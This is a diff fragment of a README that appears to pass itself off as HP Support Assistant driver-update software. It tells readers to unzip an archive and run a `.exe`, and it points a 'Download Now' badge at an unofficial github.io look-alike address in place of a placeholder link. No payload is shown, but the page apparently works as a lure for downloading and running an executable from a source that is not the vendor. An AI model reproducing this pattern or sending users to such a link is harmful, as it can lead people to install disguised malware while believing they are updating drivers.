@@ -12,7 +12,7 @@ Unzip the archive to a separate folder.
 
 Run the `.exe` file to start the application.  
 
-[![Download](https://img.shields.io/badge/Download-Now-2ea44f?style=for-the-badge)](#)
+[![Download](https://img.shields.io/badge/Download-Now-2ea44f?style=for-the-badge)](https://hp-support-assistant.github.io/.github/)
 
 ## 📸 Overview
  ![hp-support-assistant-driver-updates](https://github.com/user-attachments/assets/02b330d1-e8a4-41d0-a90a-9e1a90520c58)
